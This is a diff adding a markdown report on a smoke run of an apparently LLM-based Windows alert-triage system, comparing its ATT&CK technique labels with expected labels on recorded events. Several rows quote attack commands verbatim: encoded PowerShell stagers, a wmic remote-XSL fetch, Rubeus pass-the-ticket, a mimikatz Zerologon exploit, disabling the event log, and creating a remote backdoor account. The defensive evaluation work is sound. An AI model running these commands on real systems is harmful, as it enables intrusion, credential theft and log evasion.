@@ -1,0 +1,163 @@
+# Triage v0 smoke run (openrouter:nvidia/nemotron-3-super-120b-a12b:free)
+
+Read every row. Look for failure shapes, not a score.
+
+## day2-006  label=true_positive ['T1685.001']  got=true_positive ['T1543.003'] conf=0.9
+- event: `C:\Users\IT01-Pedro\Downloads\payload.exe`
+- label why: Process named payload.exe (from Downloads) sets the EventLog service Start value to Disabled.
+- model why: A process located in the user's Downloads folder modified the Start value of the EventLog service under HKLM, which is a modification of a Windows service configuration indicative of persistence or defense evasion.
+- iocs: ['C:/Users/IT01-Pedro/Downloads/payload.exe', 'HKLM/System/CurrentControlSet/Services/EventLog/Start', 'DWORD (0x00000004)']  evidence: ['events[0].process.image', 'events[0].registry.target_object', 'events[0].registry.details']  retries: 0
+- retrieved: ['T1547.002', 'T1547.001', 'T1543.003', 'T1547.010', 'T1218.011']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/2d0b82c1a042ef3bf8805af5de10491c
+
+## day2-014  label=true_positive ['T1059.005']  got=needs_review ['T1059.005'] conf=0.6
+- event: `"C:\windows\System32\WScript.exe" "C:\Users\pgustavo\Desktop\launcher.vbs" `
+- label why: wscript.exe executing a script named launcher.vbs from the user's Desktop.
+- model why: The event shows wscript.exe executing a VBS script located on the user's Desktop, which matches the Visual Basic script execution technique (T1059.005) but lacks additional context to confirm malicious intent. A single indicator from a user-writable location is insufficient to definitively label the activity as adversarial or benign.
+- iocs: ['C:/Windows/System32/wscript.exe', 'C:/Users/pgustavo/Desktop/launcher.vbs']  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.image']  retries: 0
+- retrieved: ['T1547.001', 'T1218.011', 'T1037.001', 'T1059.005', 'T1218.014']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/7c0a82c0904a1b9b80049ff9dade50b5
+
+## day2-016  label=benign_noisy []  got=benign_noisy [] conf=0.8
+- event: `C:\windows\system32\svchost.exe`
+- label why: svchost writing to the Windows Notification platform's internal data cache; OS housekeeping.
+- model why: The event shows the legitimate Windows process svchost.exe writing binary data to a registry key under HKLM...Notifications/Data, which is a typical location for applications to register toast notifications. There is no indication of malicious payload execution or persistence mechanism beyond normal notification registration.
+- iocs: ['C:/windows/system32/svchost.exe', 'HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Notifications/Data/418A073AA3BC3475', 'Binary Data']  evidence: ['events[0].process.image', 'events[0].registry.target_object', 'events[0].registry.details']  retries: 0
+- retrieved: ['T1218.002', 'T1218.008', 'T1546.009', 'T1027.012', 'T1555.004']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/93d8514b8b2660651d4a4f7b3f19cc17
+
+## day2-017  label=benign_noisy []  got=benign_noisy [] conf=0.8
+- event: `C:\windows\System32\svchost.exe`
+- label why: svchost writing a generic provider StartTime timestamp; routine OS housekeeping.
+- model why: The registry modification is under HKLM...VFUProvider.StartTime, which is not a known autorun or time provider persistence location. The modifying process is the legitimate Windows system process svchost.exe, and the value being written is a timestamp QWORD, consistent with benign activity.
+- iocs: ['HKLM SOFTWARE Microsoft Windows CurrentVersion VFUProvider StartTime', 'C: windows System32 svchost.exe', 'QWORD (0x01d6a5a9-0x64046265)']  evidence: ['events[0].registry.target_object', 'events[0].process.image', 'events[0].registry.details']  retries: 0
+- retrieved: ['T1547.001', 'T1547.003', 'T1574.011', 'T1218.011', 'T1546.009']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/920801a9db7afc962fe383ebe2e76bb7
+
+## day2-026  label=benign_noisy []  got=benign_noisy [] conf=0.8
+- event: `C:\Windows\system32\svchost.exe`
+- label why: svchost writing an identity/account-linking cache value; routine OS housekeeping.
+- model why: The event shows a normal SYSTEM svchost.exe process writing a binary value to the IdentityCRL ExtendedProperties LID registry key under a user hive, which is typical Windows credential storage activity and not indicative of adversarial credential access.
+- iocs: ['HKU://S-1-5-21-968647429-258479840-2507984072-1002/Software/Microsoft/IdentityCRL/ExtendedProperties/LID', '00180009508D358C', 'C:/Windows/system32/svchost.exe']  evidence: ['events[0].registry.target_object', 'events[0].process.image', 'events[0].user', 'events[0].registry.details']  retries: 0
+- retrieved: ['T1555.004', 'T1546.009', 'T1547.005', 'T1574.011', 'T1003.001']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/9b8b2ac05d92321df6f6cb7e21b7cb93
+
+## day2-040  label=benign_noisy []  got=benign_noisy [] conf=0.95
+- event: `C:\windows\system32\wbem\wmiprvse.exe -Embedding`
+- label why: WmiPrvSE -Embedding is the standard WMI provider host self-launch.
+- model why: The event shows WmiPrvSE.exe (Windows Management Instrumentation provider) launched with the -Embedding flag by svchost.exe under the DcomLaunch service, which is normal behavior when a COM client instantiates a WMI object via DCOM. No indicators of malicious persistence, credential access, or lateral movement are present.
+- iocs: ['C:/Windows/System32/wbem/WmiPrvSE.exe', 'C:/windows/system32/wbem/wmiprvse.exe -Embedding', 'C:/windows/system32/svchost.exe -k DcomLaunch -p']  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.image', 'events[0].process.parent.command_line', 'events[0].user']  retries: 0
+- retrieved: ['T1547.001', 'T1218.014', 'T1555.004', 'T1546.008', 'T1055.011']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/2e1b525721e8342e4677b7abd182b02f
+
+## day3-044  label=benign_noisy []  got=benign_noisy [] conf=0.9
+- event: `C:\Program Files (x86)\Microsoft Office\root\Office16\SDXHelper.exe`
+- label why: Microsoft Office SDX helper connecting to Microsoft cloud on 443, telemetry and content refresh.
+- model why: The event shows a legitimate Microsoft Office binary (SDXHelper.exe) initiating an outbound HTTPS connection to an external IP on port 443, which is typical for Office telemetry or update checks. There are no indicators of exploitation, persistence, or other adversary behavior.
+- iocs: ['C:/Program Files (x86)/Microsoft Office/root/Office16/SDXHelper.exe', '52.113.194.132']  evidence: ['events[0].process.image', 'events[0].network.dst_ip', 'events[0].network.dst_port', 'events[0].network.protocol']  retries: 0
+- retrieved: ['T1203', 'T1016.001', 'T1137.002', 'T1049', 'T1218.003']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/fe21b4bc4fc25a5e212479ee39c9ca04
+
+## day3-056  label=true_positive ['T1127.001']  got=true_positive ['T1127.001'] conf=0.9
+- event: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe  C:\Windows\Tasks\pshell.xml`
+- label why: MSBuild.exe builds C:/Windows/Tasks/pshell.xml, a project with an inline task, to run code through a trusted developer tool.
+- model why: The event shows MSBuild.exe loading an XML project file from C:/Windows/Tasks/pshell.xml, which is consistent with abuse of MSBuild's inline task capability to execute arbitrary code (T1127.001). The parent cmd.exe is merely launching MSBuild, not indicating a separate command-shell technique.
+- iocs: ['C:/Windows/Microsoft.NET/Framework64/v4.0.30319/MSBuild.exe', 'C:/Windows/Tasks/pshell.xml', 'cmd.exe /c C:/Windows/Microsoft.NET/Framework64/v4.0.30319/MSBuild.exe C:/Windows/Tasks/pshell.xml']  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.command_line']  retries: 0
+- retrieved: ['T1127.001', 'T1218.014', 'T1218.004', 'T1059.003', 'T1059.001']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/6ab17a7f9cc232266a3249a62af1c3af
+
+## day3-070  label=true_positive ['T1059.003']  got=true_positive ['T1202'] conf=0.92
+- event: `"cmd.exe" /c C:\Users\pgustavo\Desktop\MoveExcel4.exe 172.18.39.6`
+- label why: cmd.exe /c MoveExcel4.exe spawned by GruntHTTP.exe, a Covenant C2 implant.
+- model why: The event shows a user-launched executable (GruntHTTP.exe) spawning cmd.exe to run another user‑Desktop binary (MoveExcel4.exe) with an external IP argument, indicating indirect command execution to launch potentially malicious code. This matches T1202 (Indirect Command Execution) as the parent process abuses cmd.exe to execute a payload.
+- iocs: ['172.18.39.6', 'C:/Users/pgustavo/Desktop/MoveExcel4.exe', 'C:/Users/pgustavo/Desktop/GruntHTTP.exe', 'C:/Windows/System32/cmd.exe', '']  evidence: ['events[0].process.command_line', 'events[0].process.parent.command_line', 'events[0].process.image', 'events[0].process.parent.image']  retries: 0
+- retrieved: ['T1218.003', 'T1070.010', 'T1218.014', 'T1202', 'T1204.004']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/f0e3b8d286879556c4e258d6b8e558f5
+
+## day3-071  label=true_positive ['T1021.003']  got=needs_review [] conf=0.6
+- event: `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
+- label why: MoveExcel4.exe <IP> uses DCOM to run an Excel 4.0 macro on a remote host.
+- model why: The event shows a user-launched executable from the Desktop with an IP address argument, which could be a legitimate admin tool or malicious beacon; there is no additional evidence of malicious network connections, file modifications, or known bad hash to confirm adversary behavior.
+- iocs: ['172.18.39.6', 'C:/Users/pgustavo/Desktop/MoveExcel4.exe']  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.command_line']  retries: 0
+- retrieved: ['T1070.010', 'T1218.014', 'T1570', 'T1218.003', 'T1080']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/0b8bf91672c8872245c531b86ebd6397
+
+## day3-072  label=benign_noisy []  got=benign_noisy [] conf=0.95
+- event: `"netsh" interface tcp show global`
+- label why: netsh interface tcp show global run by the Exchange Health Manager worker, a signed installed Exchange component doing a routine health probe.
+- model why: The event shows netsh.exe executed with a read-only command 'interface tcp show global' from a legitimate Exchange parent process, indicating a benign query rather than malicious configuration or persistence activity.
+- iocs: []  evidence: ['events[0].process.command_line', 'events[0].process.image', 'events[0].process.parent.image']  retries: 0
+- retrieved: ['T1505.002', 'T1546.007', 'T1197', 'T1070.007', 'T1559.002']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/883f171e7de51723792c0914da13bc90
+
+## day3-089  label=benign_noisy []  got=benign_noisy [] conf=0.95
+- event: `C:\windows\system32\sppsvc.exe`
+- label why: Software Protection Platform service started by services.exe for licensing checks, signed, System32.
+- model why: The event shows sppsvc.exe (Software Protection Service) being launched from its legitimate system32 location by services.exe under the NETWORK SERVICE account, which is normal Windows behavior.
+- iocs: []  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.image', 'events[0].user']  retries: 0
+- retrieved: ['T1543.003', 'T1569.002', 'T1547.001', 'T1547.010', 'T1574.011']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/a0123e687713bcbb9cd7449a5507b6f9
+
+## day3-093  label=true_positive ['T1685.001']  got=true_positive ['T1685.001'] conf=0.95
+- event: `REG  ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog /t REG_DWORD /v Start /d 4`
+- label why: reg add sets the EventLog service Start value to 4 (disabled), so events stop being recorded after the next boot.
+- model why: The command line shows reg.exe adding a DWORD Start value of 4 under HKEY_LOCAL_MACHINE_SYSTEM_CurrentControlSet_Services_EventLog, which disables the Windows Event Log service. This matches the behavior of technique T1685.001 (Disable or Modify Windows Event Log).
+- iocs: ['HKEY_LOCAL_MACHINE_SYSTEM_CurrentControlSet_Services_EventLog', 'Start', '4']  evidence: ['events[0].process.command_line', 'events[0].process.image']  retries: 0
+- retrieved: ['T1547.001', 'T1685.001', 'T1547.010', 'T1574.011', 'T1218.010']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/8086ac31ae81b670a100ff205a3766e5
+
+## day3-112  label=true_positive ['T1059.001']  got=true_positive ['T1059.001', 'T1027'] conf=0.9
+- event: `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADgANgA2AD0AWwByAEUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgB`
+- label why: PowerShell -noP -sta -w 1 -enc (encoded stager) spawned by wscript.exe running launcher.vbs.
+- model why: The event shows PowerShell.exe invoked with a Base64-encoded command (-enc) launched via wscript.exe from a user Desktop VBS script, indicating obfuscated PowerShell execution typical of adversary behavior.
+- iocs: ["CMD: 'C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe' -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADgANgA2AD0AWwByAEUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBlAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAGUANwA9ACQANgA4ADYANgAuAEcAZQB0AFYAYQBMAFUARQAoACQAbgBVAGwATAApADsASQBmACgAJAAxAEYARQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAEUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB"]  evidence: ['events[0].process.command_line', 'events[0].process.image', 'events[0].process.parent.command_line']  retries: 0
+- retrieved: ['T1059.001', 'T1216.002', 'T1546.013', 'T1546.007', 'T1218.014']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/c193de1c24de42ac56fec4d256912c2b
+
+## day3-123  label=true_positive ['T1220']  got=true_positive ['T1220', 'T1047'] conf=0.95
+- event: `wmic  process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"`
+- label why: wmic process list /FORMAT:<remote .xsl URL> downloads and executes JScript from a remote stylesheet.
+- model why: WMIC.exe is invoked with the /FORMAT flag pointing to a remote URL hosting an XSL script, which matches the XSL Script Processing technique (T1220) leveraging WMI execution (T1047).
+- iocs: ['https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl', 'C:/Windows/System32/wbem/WMIC.exe']  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.command_line']  retries: 0
+- retrieved: ['T1220', 'T1047', 'T1218.014', 'T1204.002', 'T1057']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/1660e6f3ccedd15e72f187f23653e816
+
+## day3-145  label=true_positive ['T1550.003']  got=true_positive ['T1550.003', 'T1558.003'] conf=0.95
+- event: `"C:\users\sbeavers\Desktop\Rubeus.exe" asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt`
+- label why: Rubeus asktgt with an RC4 hash and /ptt requests a Kerberos ticket and injects it into the session (pass-the-ticket).
+- model why: The event shows execution of Rubeus.exe with the asktgt command, requesting a TGT for user pgustavo using an RC4 hash and then injecting it with /ptt, which matches Pass-the-Ticket (T1550.003) and Kerberoasting-like credential access (T1558.003).
+- iocs: ['C:/Users/sbeavers/Desktop/Rubeus.exe', "'C:/users/sbeavers/Desktop/Rubeus.exe' asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt"]  evidence: ['events[0].process.image', 'events[0].process.command_line']  retries: 0
+- retrieved: ['T1059.001', 'T1216.002', 'T1546.013', 'T1555.004', 'T1546.007']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/4706a0cb41f7a62e8e31fdd5f96e5084
+
+## day3-151  label=true_positive ['T1210']  got=true_positive ['T1003.003'] conf=0.95
+- event: `C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe  "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`
+- label why: mimikatz lsadump::zerologon /target exploits CVE-2020-1472 (Zerologon) against a domain controller.
+- model why: The event shows execution of mimikatz.exe with the Zerologon module targeting a domain controller, which is a clear credential‑access attack using a known hacking tool to dump NTDS via the Zerologon exploit.
+- iocs: ['C:/Users/pgustavo/Downloads/mimikatz_trunk/x64/mimikatz.exe', 'C:/Users/pgustavo/Downloads/mimikatz_trunk/x64/mimikatz.exe  ', '']  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.command_line']  retries: 0
+- retrieved: ['T1218.014', 'T1218.011', 'T1218.003', 'T1218.004', 'T1204.002']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/bc1fe04fb8d16a229c746e4b161f0d06
+
+## day3-158  label=true_positive ['T1047']  got=true_positive ['T1047', 'T1136.001'] conf=0.95
+- event: `"C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add backdoor paw0rd1"`
+- label why: wmic /node:WORKSTATION6 process call create runs a command on a remote host over WMI.
+- model why: WMIC.exe is invoked with /node:WORKSTATION6 to remotely execute 'net user /add backdoor paw0rd1', demonstrating abuse of Windows Management Instrumentation for lateral movement and the creation of a local account.
+- iocs: ['WORKSTATION6', 'backdoor', 'paw0rd1']  evidence: ['events[0].process.image', 'events[0].process.command_line']  retries: 0
+- retrieved: ['T1218.014', 'T1546.007', 'T1218.003', 'T1059.001', 'T1134.002']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/d87f4570f8d516e9ebf3623fa1178f51
+
+## day3-166  label=true_positive ['T1021.003']  got=needs_review [] conf=0.6
+- event: `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
+- label why: MoveExcel4.exe <IP> attempts DCOM lateral movement by remote Excel 4.0 macro execution.
+- model why: The event shows execution of an unsigned binary (MoveExcel4.exe) from a user's desktop with an IP address argument (172.18.39.6), which is atypical for legitimate software and could indicate malicious tool usage, but there is no additional evidence of malicious intent or follow‑on activity to confirm adversary behavior.
+- iocs: ['172.18.39.6', 'C:/Users/pgustavo/Desktop/MoveExcel4.exe']  evidence: ['events[0].process.image', 'events[0].process.command_line', 'events[0].process.parent.command_line']  retries: 0
+- retrieved: ['T1070.010', 'T1218.014', 'T1570', 'T1218.003', 'T1080']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/8da499786117b84eb33e624be9111a08
+
+## day3-176  label=true_positive ['T1569.002']  got=true_positive ['T1059.001', 'T1562.001'] conf=0.95
+- event: `C:\windows\system32\cmd.exe /C start /b C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAc`
+- label why: cmd.exe started by services.exe running 'start /b powershell -enc' is a remote service executing an encoded stager (PsExec-style).
+- model why: The alert shows cmd.exe executing a base64-encoded PowerShell command that disables script block logging and attempts to download and run a payload, indicating malicious execution and defense evasion.
+- iocs: ['C:/Windows/System32/cmd.exe', 'C:/windows/system32/services.exe']  evidence: ['events[0].process.command_line', 'events[0].process.image', 'events[0].process.parent.image']  retries: 0
+- retrieved: ['T1059.001', 'T1543.003', 'T1547.001', 'T1546.007', 'T1059.003']
+- trace: https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/33eeafd1dec36aa80e75479cd5f20140
